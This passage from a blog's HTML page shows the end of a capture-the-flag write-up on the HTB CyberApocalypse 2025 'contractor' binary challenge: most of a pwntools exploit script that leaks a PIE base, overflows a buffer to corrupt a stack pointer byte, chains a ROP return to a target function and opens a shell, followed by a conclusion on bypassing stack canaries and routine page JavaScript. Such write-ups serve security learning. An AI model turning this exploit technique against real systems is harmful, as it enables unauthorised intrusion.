<span id="cb6-35"><a href="#cb6-35" aria-hidden="true" tabindex="-1"></a>             leaked_addr <span class="op">=</span> u64(leaked_bytes.ljust(<span class="dv">8</span>, <span class="st">b'</span><span class="ch">\x00</span><span class="st">'</span>))</span>
<span id="cb6-36"><a href="#cb6-36" aria-hidden="true" tabindex="-1"></a>        <span class="cf">except</span> struct.error:</span>
<span id="cb6-37"><a href="#cb6-37" aria-hidden="true" tabindex="-1"></a>             <span class="bu">print</span>(<span class="ss">f"</span><span class="ch">\r</span><span class="ss">[-] Attempt </span><span class="sc">{</span>attempt_count<span class="sc">}</span><span class="ss">: Failed to unpack leak: </span><span class="sc">{</span>leaked_bytes<span class="sc">}</span><span class="ss">"</span>, flush<span class="op">=</span><span class="va">True</span>)</span>
<span id="cb6-38"><a href="#cb6-38" aria-hidden="true" tabindex="-1"></a>             connection.close()</span>
<span id="cb6-39"><a href="#cb6-39" aria-hidden="true" tabindex="-1"></a>             <span class="cf">continue</span> <span class="co"># Retry</span></span>
<span id="cb6-40"><a href="#cb6-40" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-41"><a href="#cb6-41" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Static offset found via GDB/Binja: address_in_leak - base_address</span></span>
<span id="cb6-42"><a href="#cb6-42" aria-hidden="true" tabindex="-1"></a>        static_offset <span class="op">=</span> <span class="bn">0x1b50</span></span>
<span id="cb6-43"><a href="#cb6-43" aria-hidden="true" tabindex="-1"></a>        elf.address <span class="op">=</span> leaked_addr <span class="op">-</span> static_offset <span class="co"># Calculate runtime base</span></span>
<span id="cb6-44"><a href="#cb6-44" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f'</span><span class="ch">\r</span><span class="ss">[+] Attempt </span><span class="sc">{</span>attempt_count<span class="sc">}</span><span class="ss">: Base @ </span><span class="sc">{</span><span class="bu">hex</span>(elf.address)<span class="sc">}</span><span class="ss">'</span>, end<span class="op">=</span><span class="st">''</span>, flush<span class="op">=</span><span class="va">True</span>)</span>
<span id="cb6-45"><a href="#cb6-45" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-46"><a href="#cb6-46" aria-hidden="true" tabindex="-1"></a>        <span class="co"># --- 2. Trigger Overflow ---</span></span>
<span id="cb6-47"><a href="#cb6-47" aria-hidden="true" tabindex="-1"></a>        connection.sendlineafter(<span class="st">b'&gt; '</span>, <span class="st">b'4'</span>) <span class="co"># Select option 4 to edit specialty</span></span>
<span id="cb6-48"><a href="#cb6-48" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-49"><a href="#cb6-49" aria-hidden="true" tabindex="-1"></a>        <span class="co"># --- 3. Craft Payload ---</span></span>
<span id="cb6-50"><a href="#cb6-50" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Padding size needs careful calculation based on GDB analysis</span></span>
<span id="cb6-51"><a href="#cb6-51" aria-hidden="true" tabindex="-1"></a>        <span class="co"># It must reach exactly the LSB of the stack pointer variable (*inf_ptr)</span></span>
<span id="cb6-52"><a href="#cb6-52" aria-hidden="true" tabindex="-1"></a>        padding_to_ptr_lsb <span class="op">=</span> <span class="dv">32</span> <span class="co"># Example value, ADJUST BASED ON DEBUGGING</span></span>
<span id="cb6-53"><a href="#cb6-53" aria-hidden="true" tabindex="-1"></a>        corruption_byte <span class="op">=</span> <span class="st">b'</span><span class="ch">\xcf</span><span class="st">'</span> <span class="co"># The byte to corrupt LSB, needs luck/retry</span></span>
<span id="cb6-54"><a href="#cb6-54" aria-hidden="true" tabindex="-1"></a>        ret_gadget_offset <span class="op">=</span> <span class="bn">0x101a</span> <span class="co"># Offset of a 'ret;' instruction</span></span>
<span id="cb6-55"><a href="#cb6-55" aria-hidden="true" tabindex="-1"></a>        target_func_offset <span class="op">=</span> elf.sym.contract <span class="co"># Offset of target function</span></span>
<span id="cb6-56"><a href="#cb6-56" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-57"><a href="#cb6-57" aria-hidden="true" tabindex="-1"></a>        payload <span class="op">=</span> <span class="st">b'A'</span> <span class="op">*</span> padding_to_ptr_lsb</span>
<span id="cb6-58"><a href="#cb6-58" aria-hidden="true" tabindex="-1"></a>        payload <span class="op">+=</span> corruption_byte</span>
<span id="cb6-59"><a href="#cb6-59" aria-hidden="true" tabindex="-1"></a>        <span class="co"># ROP Chain - written via corrupted pointer, lands on RIP</span></span>
<span id="cb6-60"><a href="#cb6-60" aria-hidden="true" tabindex="-1"></a>        payload <span class="op">+=</span> p64(elf.address <span class="op">+</span> ret_gadget_offset) <span class="co"># RET for alignment</span></span>
<span id="cb6-61"><a href="#cb6-61" aria-hidden="true" tabindex="-1"></a>        payload <span class="op">+=</span> p64(elf.address <span class="op">+</span> target_func_offset)  <span class="co"># Address of contract()</span></span>
<span id="cb6-62"><a href="#cb6-62" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-63"><a href="#cb6-63" aria-hidden="true" tabindex="-1"></a>        <span class="co"># --- 4. Send Payload ---</span></span>
<span id="cb6-64"><a href="#cb6-64" aria-hidden="true" tabindex="-1"></a>        connection.sendlineafter(<span class="st">b': '</span>, payload) <span class="co"># Send the overflow payload</span></span>
<span id="cb6-65"><a href="#cb6-65" aria-hidden="true" tabindex="-1"></a>        connection.sendlineafter(<span class="st">b'&gt; '</span>, <span class="st">b'Yes'</span>) <span class="co"># Confirm the edit</span></span>
<span id="cb6-66"><a href="#cb6-66" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-67"><a href="#cb6-67" aria-hidden="true" tabindex="-1"></a>        <span class="co"># --- 5. Check for Success (Try running a command) ---</span></span>
<span id="cb6-68"><a href="#cb6-68" aria-hidden="true" tabindex="-1"></a>        connection.sendline(<span class="st">b'echo HACKED_SUCCESS'</span>) <span class="co"># Send command to potential shell</span></span>
<span id="cb6-69"><a href="#cb6-69" aria-hidden="true" tabindex="-1"></a>        result <span class="op">=</span> connection.recvline_contains(<span class="st">b'HACKED_SUCCESS'</span>, timeout<span class="op">=</span><span class="fl">0.3</span>) <span class="co"># Increased timeout slightly</span></span>
<span id="cb6-70"><a href="#cb6-70" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-71"><a href="#cb6-71" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="st">b'HACKED_SUCCESS'</span> <span class="kw">in</span> result:</span>
<span id="cb6-72"><a href="#cb6-72" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="ss">f'</span><span class="ch">\n\n</span><span class="ss">[!] Success on attempt </span><span class="sc">{</span>attempt_count<span class="sc">}</span><span class="ss">! Shell obtained.'</span>)</span>
<span id="cb6-73"><a href="#cb6-73" aria-hidden="true" tabindex="-1"></a>            connection.interactive() <span class="co"># Get interactive shell</span></span>
<span id="cb6-74"><a href="#cb6-74" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span> <span class="co"># Exit retry loop</span></span>
<span id="cb6-75"><a href="#cb6-75" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-76"><a href="#cb6-76" aria-hidden="true" tabindex="-1"></a>        <span class="co"># If command didn't work, assume exploit failed for this alignment</span></span>
<span id="cb6-77"><a href="#cb6-77" aria-hidden="true" tabindex="-1"></a>        connection.close()</span>
<span id="cb6-78"><a href="#cb6-78" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-79"><a href="#cb6-79" aria-hidden="true" tabindex="-1"></a>    <span class="cf">except</span> <span class="pp">EOFError</span>: <span class="co"># Process likely crashed or closed connection</span></span>
<span id="cb6-80"><a href="#cb6-80" aria-hidden="true" tabindex="-1"></a>        <span class="co"># print(f"\r[-] Attempt {attempt_count}: EOFError", flush=True) # Uncomment for debug</span></span>
<span id="cb6-81"><a href="#cb6-81" aria-hidden="true" tabindex="-1"></a>        connection.close()</span>
<span id="cb6-82"><a href="#cb6-82" aria-hidden="true" tabindex="-1"></a>    <span class="cf">except</span> <span class="pp">Exception</span> <span class="im">as</span> e: <span class="co"># Catch other potential errors</span></span>
<span id="cb6-83"><a href="#cb6-83" aria-hidden="true" tabindex="-1"></a>        <span class="co"># print(f"\r[-] Attempt {attempt_count}: Error {e}", flush=True) # Uncomment for debug</span></span>
<span id="cb6-84"><a href="#cb6-84" aria-hidden="true" tabindex="-1"></a>        connection.close()</span>
<span id="cb6-85"><a href="#cb6-85" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-86"><a href="#cb6-86" aria-hidden="true" tabindex="-1"></a><span class="co"># Optional: Add a max attempts check here if desired</span></span>
<span id="cb6-87"><a href="#cb6-87" aria-hidden="true" tabindex="-1"></a><span class="co"># if not connection.connected:</span></span>
<span id="cb6-88"><a href="#cb6-88" aria-hidden="true" tabindex="-1"></a><span class="co">#    print("\n[-] Exploit failed after multiple attempts.")</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="conclusion" class="level2">
<h2 class="anchored" data-anchor-id="conclusion">Conclusion</h2>
<p>This analysis of the <code>contractor</code> challenge from HTB CyberApocalypse 2025 demonstrated a practical technique for bypassing stack canaries without needing to leak the canary value itself. By leveraging a detailed understanding of the stack layout gained through debugging, and exploiting the immediate effect of overwriting a stack-based pointer used within the overflow routine itself, control flow hijacking was achieved despite multiple modern defenses (Canary, PIE, NX, SHSTK, IBT). This highlights that even with layered security, vulnerabilities in specific code patterns and memory layouts can provide viable exploitation paths, often requiring careful analysis and sometimes non-deterministic techniques like the retry loop used here to handle ASLR-induced alignment variations.</p>


</section>

</main> <!-- /main -->
<script id="quarto-html-after-body" type="application/javascript">
window.document.addEventListener("DOMContentLoaded", function (event) {
  const toggleBodyColorMode = (bsSheetEl) => {
    const mode = bsSheetEl.getAttribute("data-mode");
    const bodyEl = window.document.querySelector("body");
    if (mode === "dark") {
      bodyEl.classList.add("quarto-dark");
      bodyEl.classList.remove("quarto-light");
    } else {
      bodyEl.classList.add("quarto-light");
      bodyEl.classList.remove("quarto-dark");
    }
  }
  const toggleBodyColorPrimary = () => {
    const bsSheetEl = window.document.querySelector("link#quarto-bootstrap");
    if (bsSheetEl) {
      toggleBodyColorMode(bsSheetEl);
    }
  }
  toggleBodyColorPrimary();  
  const icon = "";
  const anchorJS = new window.AnchorJS();
  anchorJS.options = {
    placement: 'right',
    icon: icon
  };
  anchorJS.add('.anchored');
  const isCodeAnnotation = (el) => {
    for (const clz of el.classList) {
      if (clz.startsWith('code-annotation-')) {                     
        return true;
      }
    }
    return false;
  }
  const clipboard = new window.ClipboardJS('.code-copy-button', {
    text: function(trigger) {
      const codeEl = trigger.previousElementSibling.cloneNode(true);
      for (const childEl of codeEl.children) {
        if (isCodeAnnotation(childEl)) {
          childEl.remove();
        }
      }
      return codeEl.innerText;
    }
  });
  clipboard.on('success', function(e) {
    // button target
    const button = e.trigger;
    // don't keep focus
    button.blur();
    // flash "checked"
    button.classList.add('code-copy-button-checked');
    var currentTitle = button.getAttribute("title");
    button.setAttribute("title", "Copied!");
    let tooltip;
    if (window.bootstrap) {
      button.setAttribute("data-bs-toggle", "tooltip");
      button.setAttribute("data-bs-placement", "left");
      button.setAttribute("data-bs-title", "Copied!");
      tooltip = new bootstrap.Tooltip(button, 
        { trigger: "manual", 
          customClass: "code-copy-button-tooltip",
          offset: [0, -8]});
      tooltip.show();    
    }
    setTimeout(function() {
      if (tooltip) {
        tooltip.hide();
        button.removeAttribute("data-bs-title");
        button.removeAttribute("data-bs-toggle");
        button.removeAttribute("data-bs-placement");
      }
      button.setAttribute("title", currentTitle);
      button.classList.remove('code-copy-button-checked');
    }, 1000);
    // clear code selection
    e.clearSelection();
  });
    var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
    var mailtoRegex = new RegExp(/^mailto:/);
      var filterRegex = new RegExp('/' + window.location.host + '/');
    var isInternal = (href) => {
        return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
    }
    // Inspect non-navigation links and adorn them if external
 	var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool)');
    for (var i=0; i<links.length; i++) {
      const link = links[i];
      if (!isInternal(link.href)) {
        // undo the damage that might have been done by quarto-nav.js in the case of
        // links that we want to consider external
        if (link.dataset.originalHref !== undefined) {
          link.href = link.dataset.originalHref;
        }
      }
    }
  function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
    const config = {
      allowHTML: true,
      maxWidth: 500,
      delay: 100,
      arrow: false,
      appendTo: function(el) {
          return el.parentElement;
      },
      interactive: true,
      interactiveBorder: 10,
      theme: 'quarto',
      placement: 'bottom-start',
    };
    if (contentFn) {
      config.content = contentFn;
    }
    if (onTriggerFn) {
      config.onTrigger = onTriggerFn;
    }
    if (onUntriggerFn) {
      config.onUntrigger = onUntriggerFn;
    }
    window.tippy(el, config); 
  }
  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
  for (var i=0; i<noterefs.length; i++) {
    const ref = noterefs[i];
    tippyHover(ref, function() {
      // use id or data attribute instead here
      let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
      try { href = new URL(href).hash; } catch {}
      const id = href.replace(/^#\/?/, "");
      const note = window.document.getElementById(id);
      if (note) {
        return note.innerHTML;
      } else {
        return "";
      }
    });
  }
  const xrefs = window.document.querySelectorAll('a.quarto-xref');
  const processXRef = (id, note) => {
    // Strip column container classes
    const stripColumnClz = (el) => {
      el.classList.remove("page-full", "page-columns");
      if (el.children) {
        for (const child of el.children) {
          stripColumnClz(child);
        }
      }
    }
    stripColumnClz(note)
    if (id === null || id.startsWith('sec-')) {
      // Special case sections, only their first couple elements
      const container = document.createElement("div");
      if (note.children && note.children.length > 2) {
        container.appendChild(note.children[0].cloneNode(true));
        for (let i = 1; i < note.children.length; i++) {
          const child = note.children[i];
          if (child.tagName === "P" && child.innerText === "") {
            continue;
          } else {
            container.appendChild(child.cloneNode(true));
            break;
          }
        }
        if (window.Quarto?.typesetMath) {
          window.Quarto.typesetMath(container);
        }
        return container.innerHTML
      } else {
        if (window.Quarto?.typesetMath) {
          window.Quarto.typesetMath(note);
        }
        return note.innerHTML;
      }
    } else {
      // Remove any anchor links if they are present
      const anchorLink = note.querySelector('a.anchorjs-link');
      if (anchorLink) {
        anchorLink.remove();
      }
      if (window.Quarto?.typesetMath) {
        window.Quarto.typesetMath(note);
      }
      // TODO in 1.5, we should make sure this works without a callout special case
      if (note.classList.contains("callout")) {
        return note.outerHTML;
      } else {
        return note.innerHTML;
      }
    }
  }
  for (var i=0; i<xrefs.length; i++) {
    const xref = xrefs[i];
    tippyHover(xref, undefined, function(instance) {
      instance.disable();
      let url = xref.getAttribute('href');
      let hash = undefined; 
      if (url.startsWith('#')) {
        hash = url;
      } else {
        try { hash = new URL(url).hash; } catch {}
      }
      if (hash) {
        const id = hash.replace(/^#\/?/, "");
        const note = window.document.getElementById(id);
        if (note !== null) {
          try {
            const html = processXRef(id, note.cloneNode(true));
            instance.setContent(html);
          } finally {
            instance.enable();
            instance.show();
          }
        } else {
          // See if we can fetch this
          fetch(url.split('#')[0])
          .then(res => res.text())
          .then(html => {
            const parser = new DOMParser();
            const htmlDoc = parser.parseFromString(html, "text/html");
            const note = htmlDoc.getElementById(id);
            if (note !== null) {
              const html = processXRef(id, note);
              instance.setContent(html);
            } 
          }).finally(() => {
            instance.enable();
            instance.show();
          });
        }
      } else {
        // See if we can fetch a full url (with no hash to target)
        // This is a special case and we should probably do some content thinning / targeting
        fetch(url)
        .then(res => res.text())
        .then(html => {
          const parser = new DOMParser();
          const htmlDoc = parser.parseFromString(html, "text/html");
          const note = htmlDoc.querySelector('main.content');
          if (note !== null) {
            // This should only happen for chapter cross references
            // (since there is no id in the URL)
            // remove the first header
            if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
              note.children[0].remove();
            }
            const html = processXRef(null, note);
            instance.setContent(html);
          } 
        }).finally(() => {
          instance.enable();
          instance.show();
        });
      }
    }, function(instance) {
    });
  }
      let selectedAnnoteEl;
      const selectorForAnnotation = ( cell, annotation) => {
        let cellAttr = 'data-code-cell="' + cell + '"';
        let lineAttr = 'data-code-annotation="' +  annotation + '"';
        const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
        return selector;
      }
      const selectCodeLines = (annoteEl) => {
        const doc = window.document;
        const targetCell = annoteEl.getAttribute("data-target-cell");
        const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
        const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
        const lines = annoteSpan.getAttribute("data-code-lines").split(",");
        const lineIds = lines.map((line) => {
          return targetCell + "-" + line;
        })
        let top = null;
        let height = null;
        let parent = null;
        if (lineIds.length > 0) {
            //compute the position of the single el (top and bottom and make a div)
            const el = window.document.getElementById(lineIds[0]);
            top = el.offsetTop;
            height = el.offsetHeight;
            parent = el.parentElement.parentElement;
          if (lineIds.length > 1) {
            const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
            const bottom = lastEl.offsetTop + lastEl.offsetHeight;
            height = bottom - top;
          }
          if (top !== null && height !== null && parent !== null) {
            // cook up a div (if necessary) and position it 
            let div = window.document.getElementById("code-annotation-line-highlight");
            if (div === null) {
              div = window.document.createElement("div");
              div.setAttribute("id", "code-annotation-line-highlight");
              div.style.position = 'absolute';
              parent.appendChild(div);
            }
            div.style.top = top - 2 + "px";
            div.style.height = height + 4 + "px";
            div.style.left = 0;
            let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
            if (gutterDiv === null) {
              gutterDiv = window.document.createElement("div");
              gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
              gutterDiv.style.position = 'absolute';
              const codeCell = window.document.getElementById(targetCell);
              const gutter = codeCell.querySelector('.code-annotation-gutter');
              gutter.appendChild(gutterDiv);
            }
            gutterDiv.style.top = top - 2 + "px";
            gutterDiv.style.height = height + 4 + "px";
          }
          selectedAnnoteEl = annoteEl;
        }
      };
      const unselectCodeLines = () => {
        const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
        elementsIds.forEach((elId) => {
          const div = window.document.getElementById(elId);
          if (div) {
            div.remove();
          }
        });
        selectedAnnoteEl = undefined;
      };
        // Handle positioning of the toggle
    window.addEventListener(
      "resize",
      throttle(() => {
        elRect = undefined;
        if (selectedAnnoteEl) {
          selectCodeLines(selectedAnnoteEl);
        }
      }, 10)
    );
    function throttle(fn, ms) {
    let throttle = false;
    let timer;
      return (...args) => {
        if(!throttle) { // first call gets through
            fn.apply(this, args);
            throttle = true;
        } else { // all the others get throttled
            if(timer) clearTimeout(timer); // cancel #2
            timer = setTimeout(() => {
              fn.apply(this, args);
              timer = throttle = false;
            }, ms);
        }
      };
    }
      // Attach click handler to the DT
      const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
      for (const annoteDlNode of annoteDls) {
        annoteDlNode.addEventListener('click', (event) => {
          const clickedEl = event.target;
          if (clickedEl !== selectedAnnoteEl) {
            unselectCodeLines();
            const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
            if (activeEl) {
              activeEl.classList.remove('code-annotation-active');
            }
            selectCodeLines(clickedEl);
            clickedEl.classList.add('code-annotation-active');
          } else {
            // Unselect the line
            unselectCodeLines();
            clickedEl.classList.remove('code-annotation-active');
          }
        });
      }
  const findCites = (el) => {
    const parentEl = el.parentElement;
    if (parentEl) {
      const cites = parentEl.dataset.cites;
      if (cites) {
        return {
          el,
          cites: cites.split(' ')
        };
      } else {
        return findCites(el.parentElement)
      }
    } else {
      return undefined;
    }
  };
  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
  for (var i=0; i<bibliorefs.length; i++) {
    const ref = bibliorefs[i];
    const citeInfo = findCites(ref);
    if (citeInfo) {
      tippyHover(citeInfo.el, function() {
        var popup = window.document.createElement('div');
        citeInfo.cites.forEach(function(cite) {
          var citeDiv = window.document.createElement('div');
          citeDiv.classList.add('hanging-indent');
          citeDiv.classList.add('csl-entry');
          var biblioDiv = window.document.getElementById('ref-' + cite);
          if (biblioDiv) {
            citeDiv.innerHTML = biblioDiv.innerHTML;
          }
          popup.appendChild(citeDiv);
        });
        return popup.innerHTML;
      });
    }
  }
});
</script>
</div> <!-- /content -->




</body></html>